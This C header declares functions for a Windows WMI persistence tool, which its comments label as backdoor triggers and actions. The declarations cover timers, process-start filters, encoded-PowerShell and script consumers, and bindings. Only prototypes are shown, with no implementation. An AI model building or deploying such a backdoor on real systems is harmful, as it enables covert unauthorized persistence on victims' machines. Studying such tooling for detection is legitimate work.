#ifndef WMI_PERSISTENCE_H
#define WMI_PERSISTENCE_H

#include <Windows.h>
#include <Wbemidl.h>

/****************************************************************************
 * timer instance configure functions (Backdoor Triggers)
 */

HRESULT interval_timer(IWbemClassObject *timer, wchar_t *timerid, wchar_t *event_namespace);
HRESULT absolute_timer(IWbemClassObject *timer, wchar_t *timerid, wchar_t *event_namespace);

/****************************************************************************
 * __EventFilter instance configure functions (Backdoor Triggers)
 */

HRESULT generic_trigger(IWbemClassObject *event_filter, wchar_t *trigger_name, wchar_t *query, wchar_t *event_namespace);
HRESULT process_start_trigger(IWbemClassObject *event_filter, wchar_t *trigger_name, wchar_t *proc_name, wchar_t *event_namespace);
HRESULT timing_trigger(IWbemClassObject *event_filter, wchar_t *trigger_name, wchar_t *event_namespace, wchar_t *timer_name);

/****************************************************************************
 * Event consumer instance configure functions (Backdoor Actions)
 */

HRESULT generic_action(IWbemClassObject *event_consumer, wchar_t *action_name, wchar_t *script);
HRESULT process_kill_action(IWbemClassObject *event_consumer, wchar_t *action_name);
HRESULT enc_powershell_action(IWbemClassObject *event_consumer, wchar_t *action_name, wchar_t *enc_cmd);
HRESULT script_generic_action(IWbemClassObject *event_consumer, wchar_t *action_name, wchar_t *file_path);

/****************************************************************************
 * Event_consumer_binding instance configure functions (Backdoor Actions)
 */

HRESULT generic_binding(IWbemClassObject *binding, wchar_t *consumer_type, wchar_t *consumr_name, wchar_t *filtr_name);

#endif